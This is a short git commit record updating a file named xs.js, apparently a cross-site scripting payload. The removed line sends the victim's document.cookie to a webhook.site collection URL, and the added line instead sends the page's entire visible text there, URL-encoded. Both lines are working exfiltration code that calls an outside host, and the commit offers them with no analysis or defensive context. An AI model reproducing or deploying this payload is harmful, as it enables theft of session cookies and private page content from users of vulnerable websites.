255bccf3bc694cf03f2a10e93423925ce51799c4
unk-j <unknownmaxim@gmail.com>
2025-02-28 23:21:56 +0200

    Update xs.js

--- xs.js
+++ xs.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/22abf491-b9f9-4ba2-8277-bed043be3f14?cookie='+document.cookie);
+fetch('https://webhook.site/22abf491-b9f9-4ba2-8277-bed043be3f14?data=' + encodeURIComponent(document.body.innerText));
